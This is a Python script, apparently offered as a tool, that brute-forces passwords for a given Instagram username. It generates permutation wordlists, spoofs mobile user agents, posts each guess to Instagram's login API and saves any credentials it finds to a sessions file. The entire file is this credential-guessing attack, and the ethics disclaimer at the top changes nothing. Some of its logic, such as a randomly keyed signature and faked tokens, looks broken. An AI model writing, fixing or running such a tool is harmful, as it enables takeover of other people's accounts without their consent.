import os
import random
import string
import requests
import hashlib
import hmac
import json
import itertools
import time
from concurrent.futures import ThreadPoolExecutor\

# Created by MUHAMMAD HAMMAD HAIDER
# Must be use Ethically within legal considerations.

# Configuration
USER_AGENT_LIST = [
    "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)",
    "Instagram 11.0.0 Android (18/5.0; 480dpi; 1080x1920; Samsung; Galaxy S10; arm64; en_US)",
    # Add more User-Agents here
]

# Custom headers
def generate_headers():
    user_agent = random.choice(USER_AGENT_LIST)
    return {
        "User-Agent": user_agent,
        "Accept": "*/*",
        "Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Connection": "close",
        "Accept-Language": "en-US",
    }

# Function to generate dynamic secrets and identifiers
def generate_dynamic_secret():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

def generate_uuid():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))

# Session management
def save_session(user, password, wordlist_file, filename="sessions.json"):
    session_data = {
        "user": user,
        "password": password,
        "wordlist": wordlist_file,
        "timestamp": time.time(),
    }
    
    if not os.path.exists("sessions"):
        os.makedirs("sessions")
    
    with open(os.path.join("sessions", filename), "a") as file:
        json.dump(session_data, file)
        file.write("\n")
    
    print(f"Session saved for user {user}.")

# Check for necessary dependencies
def check_dependencies():
    try:
        import requests
        print("Dependencies are satisfied.")
    except ImportError as e:
        print(f"Error: {e}. Please install the required dependencies.")
        exit(1)

# Generate all combinations of words (brute-force combinations)
def generate_combinations(words):
    combinations = []
    for r in range(1, len(words) + 1):  # generate combinations from length 1 to full length
        for comb in itertools.permutations(words, r):
            combinations.append(''.join(comb))
    return combinations

# Brute-force function
def brute_force(user, wordlist, headers, phone, csrf_token, device_id, uuid):
    found = False
    with open(wordlist, 'r') as file:
        for password in file:
            password = password.strip()
            
            # Print the password being tried (for monitoring purposes)
            print(f"Trying password: {password}")
            
            data = {
                "phone_id": phone,
                "_csrftoken": csrf_token,
                "username": user,
                "guid": uuid,
                "device_id": device_id,
                "password": password,
                "login_attempt_count": 0,
            }
            hmac_signature = generate_hmac_signature(data)
            headers["x-signature"] = hmac_signature

            response = requests.post(
                "https://i.instagram.com/api/v1/accounts/login/",
                headers=headers,
                data=data,
            )
            
            if response.status_code == 200:
                print(f"Password found: {password}")
                save_session(user, password, wordlist)
                found = True
                break
            elif "challenge" in response.text:
                print(f"Password found: {password}, but challenge required.")
                save_session(user, password, wordlist)
                found = True
                break

    if not found:
        print("Password not found in the wordlist.")

# Function to generate HMAC signature (for security)
def generate_hmac_signature(data):
    sig_key = generate_dynamic_secret()  # Using a dynamically generated key
    serialized_data = json.dumps(data, separators=(",", ":"))
    return hmac.new(sig_key.encode(), serialized_data.encode(), hashlib.sha256).hexdigest()

# Main function
def main():
    check_dependencies()

    # Ask user if they want to create a custom wordlist
    custom_wordlist = input("Do you want to create your own password wordlist? (y/n): ").strip().lower()

    if custom_wordlist == 'y':
        print("Enter your words (space-separated): ")
        words_input = input().strip()
        words = words_input.split()
        combinations = generate_combinations(words)
        
        # Save the combinations to a file
        wordlist_filename = "custom_wordlist.txt"
        with open(wordlist_filename, 'w') as f:
            for comb in combinations:
                f.write(comb + '\n')
        
        print(f"Custom wordlist created with {len(combinations)} combinations: {wordlist_filename}")
        wordlist = wordlist_filename

    else:
        wordlist = input("Enter the path to your wordlist: ").strip()
        if not os.path.exists(wordlist):
            print(f"Wordlist {wordlist} does not exist.")
            exit(1)

    # Proceed with brute force
    user = input("Enter the Instagram username: ").strip()
    phone = generate_dynamic_secret()
    csrf_token = generate_dynamic_secret()  # Simulating CSRF token generation
    device_id = generate_uuid()
    uuid = generate_uuid()

    headers = generate_headers()

    print(f"Starting brute-force attempt for {user}...")
    
    # Use ThreadPoolExecutor for concurrent password testing
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.submit(brute_force, user, wordlist, headers, phone, csrf_token, device_id, uuid)

if __name__ == "__main__":
    main()
